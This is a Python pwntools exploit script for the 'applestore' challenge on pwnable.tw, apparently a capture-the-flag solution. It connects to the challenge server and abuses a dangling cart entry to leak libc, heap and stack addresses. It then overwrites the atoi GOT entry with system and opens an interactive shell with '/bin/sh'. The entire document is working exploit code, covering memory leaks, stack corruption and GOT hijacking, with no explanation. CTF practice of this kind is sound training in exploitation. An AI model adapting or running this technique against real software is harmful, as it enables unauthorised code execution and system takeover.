from pwn import *

#s = process("/root/applestore")
s = remote("chall.pwnable.tw",10104)

read_got = 0x0804B00C
atoi_got = 0x0804B040
def add(idx):
	s.recvuntil("> ")
	s.sendline("2")
	s.recvuntil("Device Number> ")
	s.sendline(str(idx))

def delete(idx):
	s.recvuntil("> ")
	s.sendline("3")
	s.recvuntil("Item Number> ")
	s.sendline(idx)

def cart(data):
	s.recvuntil("> ")
	s.sendline("4")
	s.recvuntil("ok? (y/n) > ")
	s.send(data)

def checkout():
	s.recvuntil("> ")
	s.sendline("5")
	s.recvuntil("ok? (y/n) > ")
	s.send("y")

for i in range(0,6):
	add(1)

for i in range(0,20):
	add(2)

checkout()

cart("y\x00"+p32(read_got)+p32(0)+p32(0))
s.recvuntil("27: ")
libc_base = u32(s.recv(4))-0x000d41c0
libc_system = libc_base +0x0003a940
libc_binsh = libc_base + 0x158e8b
print "libc_base :"+hex(libc_base)

cart("y\x00"+p32(0x0804B070)+p32(0)+p32(0))
s.recvuntil("27: ")
heap_base = u32(s.recv(4)) -16
heap_leak = heap_base + 0x4a8+8
print "heap_base : "+hex(heap_base)

cart("y\x00"+p32(heap_leak)+p32(0)+p32(0))
s.recvuntil("27: ")
stack_ebp = u32(s.recv(4)) + 0x20
stack_rop = stack_ebp + 8 + 0x16 + 2
print "stack_ebp : "+hex(stack_ebp)

delete("27"+p32(stack_ebp)+'aaaa'+p32(atoi_got + 0x22)+p32(stack_ebp-8))

s.recvuntil("> ")
s.send(p32(libc_system)+";/bin/sh")
s.interactive()
